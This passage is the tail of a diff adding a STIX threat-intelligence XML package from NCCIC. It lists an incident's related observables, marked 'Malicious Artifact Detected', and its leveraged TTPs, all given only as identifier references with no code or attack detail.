+                    <stixCommon:Observable idref="NCCIC:Observable-135199df-acd7-4d7b-8bb8-caf66f1fabc1">
+                    </stixCommon:Observable>
+                </incident:Related_Observable>
+                <incident:Related_Observable>
+                    <stixCommon:Relationship>Malicious Artifact Detected</stixCommon:Relationship>
+                    <stixCommon:Observable idref="NCCIC:Observable-582bda36-6f4e-44a7-9eb3-f3829bd82864">
+                    </stixCommon:Observable>
+                </incident:Related_Observable>
+                <incident:Related_Observable>
+                    <stixCommon:Relationship>Malicious Artifact Detected</stixCommon:Relationship>
+                    <stixCommon:Observable idref="NCCIC:Observable-c36b18e5-f680-42ea-a321-977c86a14930">
+                    </stixCommon:Observable>
+                </incident:Related_Observable>
+            </incident:Related_Observables>
+            <incident:Leveraged_TTPs>
+                <incident:Leveraged_TTP>
+                    <stixCommon:TTP idref="NCCIC:ttp-e6f8e8fc-d0d4-423c-829c-4e483e3c4aa2" xsi:type='ttp:TTPType'/>
+                </incident:Leveraged_TTP>
+                <incident:Leveraged_TTP>
+                    <stixCommon:TTP idref="NCCIC:ttp-f9aa82b4-5d2e-47d0-b538-880696c8ac6f" xsi:type='ttp:TTPType'/>
+                </incident:Leveraged_TTP>
+                <incident:Leveraged_TTP>
+                    <stixCommon:TTP idref="NCCIC:ttp-d71501b9-5492-4a43-852c-a13cb73b0c06" xsi:type='ttp:TTPType'/>
+                </incident:Leveraged_TTP>
+                <incident:Leveraged_TTP>
+                    <stixCommon:TTP idref="NCCIC:ttp-1867cc89-3fc7-4843-9cf3-9d89d6f255e1" xsi:type='ttp:TTPType'/>
+                </incident:Leveraged_TTP>
+                <incident:Leveraged_TTP>
+                    <stixCommon:TTP idref="NCCIC:ttp-8015444b-e19f-41f0-b365-43bf7393da18" xsi:type='ttp:TTPType'/>
+                </incident:Leveraged_TTP>
+            </incident:Leveraged_TTPs>
+        </stix:Incident>
+    </stix:Incidents>
+</stix:STIX_Package>
